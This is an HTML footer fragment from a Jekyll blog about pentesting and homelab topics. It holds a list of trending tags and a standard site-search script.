class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ap3x.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
